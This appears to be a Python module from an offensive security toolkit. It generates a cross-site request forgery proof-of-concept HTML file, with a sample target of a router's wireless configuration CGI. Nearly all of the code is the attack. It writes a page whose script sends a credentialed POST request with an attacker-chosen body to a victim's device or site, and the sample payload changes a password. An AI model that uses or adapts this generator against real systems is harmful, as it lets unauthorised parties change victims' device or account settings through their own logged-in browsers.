# binwalk -Mre filename
#
import getpass


from tools.Utility import *


class Csrf(UtilityTool):
    def __init__(self, config_file):
        super(Csrf, self).__init__(config_file)

    def get_basic_command(self, cmd):
        uname = getpass.getuser()
        filename = '/home/{}/Desktop/poc.html'.format(uname)
        poc = open(filename, 'w')
        poc.writelines('<html>\n')
        poc.writelines('<head>\n')
        poc.writelines('    <script>\n')
        poc.writelines('        csrf = function () {\n')
        poc.writelines('            var x = new XMLHttpRequest();\n')
        poc.writelines('            x.open("POST", "{}");\n'.format(cmd['url']))
        poc.writelines('            x.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");\n')
        poc.writelines('            x.withCredentials = true;\n')
        poc.writelines('            x.send("{}");\n'.format(cmd['payload']))
        poc.writelines('        }\n')
        poc.writelines('   </script>\n')
        poc.writelines('</head>\n')
        poc.writelines('<body>\n')
        poc.writelines('<button onclick="csrf()">Submit</button>\n')
        poc.writelines('</body>\n')
        poc.writelines('</html>\n')

        poc.close()

        return 'echo The poc.html file is located on the Desktop'


if __name__ == '__main__':
    test_obj = Csrf("config.json")
    cmd = {}

    cmd['url'] = 'http://10.10.10.254/cgi-bin/wireless.cgi'
    cmd['payload'] = 'password=1&pay=2'

    cmd = (test_obj.get_basic_command(cmd))
